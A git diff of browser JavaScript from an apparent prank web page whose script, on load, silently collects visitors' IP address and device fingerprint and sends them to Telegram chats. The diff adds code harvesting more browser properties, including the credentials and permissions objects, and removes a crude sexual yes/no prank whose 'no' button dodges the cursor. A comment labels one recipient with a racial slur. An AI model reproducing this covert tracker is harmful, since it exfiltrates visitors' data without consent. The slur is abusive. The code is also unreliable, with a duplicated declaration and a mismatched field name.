@@ -9,9 +9,7 @@ const CHAT_IDS = [
     "8219025301",   // Luiz (Mono macaco queimado preto escravo)
 ];
 
-const cuSim = document.getElementById('cuSim');
-const cuNao = document.getElementById('cuNao');
-const resposta = document.getElementById('cuResposta');
+
 // função desgraçada pra mandar msg alternativa
 async function SendCoisa(text) {
     for (const chatId of CHAT_IDS) {
@@ -38,7 +36,23 @@ function detectDeviceType() {
 function getDeviceInfo() {
     const deviceType = detectDeviceType();
     const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unkown";
-    
+    const deviceType = detectDeviceType();
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unkown";
+    const others = {
+        "navigator app_name: " : navigator.appName,
+        "navigator app_version: " : navigator.appVersion,
+        "user gpu: " : navigator.gpu,
+        "user gamepads: " : navigator.getGamepads,
+        "storage: " : navigator.storage,
+        "java enable?: " : navigator.javaEnabled(),
+        "permissons of site: " : navigator.permissions,
+        "You want a cookie?: " : navigator.cookieEnabled,
+        "credentials: " : navigator.credentials,
+        "plugins: " : navigator.plugins,
+        "product: ": navigator.product,
+        "type of connection wifi: " :  navigator.connection,
+        "connection state: " : navigator.onLine,
+    }
     return {
         deviceType,
         userAgent: navigator.userAgent,
@@ -48,7 +62,8 @@ function getDeviceInfo() {
         windowSize: `${window.innerWidth} x ${window.innerHeight}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: ram
+        deviceMemory: ram,
+        outros: others
     };
 }
 
@@ -110,7 +125,8 @@ async function sendMessage(ip) {
                     `• Tipo: ${device.deviceType}\n` +
                     `• Sistema: ${device.platform}\n` +
                     `• Tela: ${device.screen}\n` +
-                    `• RAM: ${device.deviceMemory}\n\n` +
+                    `• RAM: ${device.deviceMemory}\n` +
+                    `• Outros: ${device.others}\n\n` +
                     `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;
 
     for (const chatId of CHAT_IDS) {
@@ -134,50 +150,5 @@ async function captureIPOnLoad() {
 async function init() {
     await captureIPOnLoad();   // Pega IPv4 + envia a mensagem no teleporra
 }
-
-function moverBotao(btn) {
-    if (getComputedStyle(btn).position === 'static') {
-        btn.style.position = 'fixed';
-    }
-
-    const viewport = window.visualViewport || window;
-    const larguraJanela = viewport.width || window.innerWidth;
-    const alturaJanela = viewport.height || window.innerHeight;
-
-    const larguraBtn = btn.offsetWidth;
-    const alturaBtn = btn.offsetHeight;
-
-    const maxX = Math.max(0, larguraJanela - larguraBtn);
-    const maxY = Math.max(0, alturaJanela - alturaBtn);
-
-    const novaX = Math.random() * maxX;
-    const novaY = Math.random() * maxY;
-
-    btn.style.left = novaX + 'px';
-    btn.style.top = novaY + 'px';
-}
-
-function mostrarResposta(texto) {
-    resposta.textContent = texto;
-}
-
-// Botão SIM
-cuSim.addEventListener('click', async () => {
-    mostrarResposta('Aaa que bom! Fico feliz 😊💜');
-    SendCoisa('🎉 ELA DISSE SIM! 🎉\nEla falou que vai dar o cuzinho!\nOloko, ai sim kaakakak');   
-});
-        
-// Botão NÃO - foge do cursor/dedo
-cuNao.addEventListener('mouseenter', () => moverBotao(cuNao));
-        
-cuNao.addEventListener('touchstart', (e) => {
-    e.preventDefault();
-    moverBotao(cuNao);
-});
-
-cuNao.addEventListener('click', (e) => {
-    e.preventDefault();
-    moverBotao(cuNao);
-});
 
 init();
